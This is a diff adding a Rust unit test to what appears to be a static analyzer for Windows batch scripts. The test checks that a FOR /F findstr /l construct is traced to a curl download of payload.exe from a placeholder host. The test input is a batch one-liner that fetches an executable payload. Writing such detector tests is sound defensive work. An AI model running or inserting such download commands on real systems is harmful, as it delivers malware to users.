@@ -3851,6 +3851,28 @@ for /f "tokens=1,* delims=:" %%A in ('findstr /o "https://" web.txt') do curl -o
     }
 
     #[test]
+    fn for_f_findstr_l_keeps_bracketed_literal_url() {
+        let report = analyze(
+            br#"echo https://findstr-literal.example/[a]/payload.exe>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /l "https://findstr-literal.example/[a]/payload.exe" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-literal.example/[a]/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /l literal URL was treated as regex: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_find_n_line_number_prefix_can_be_stripped() {
         let report = analyze(
             br#"echo noise>web.txt
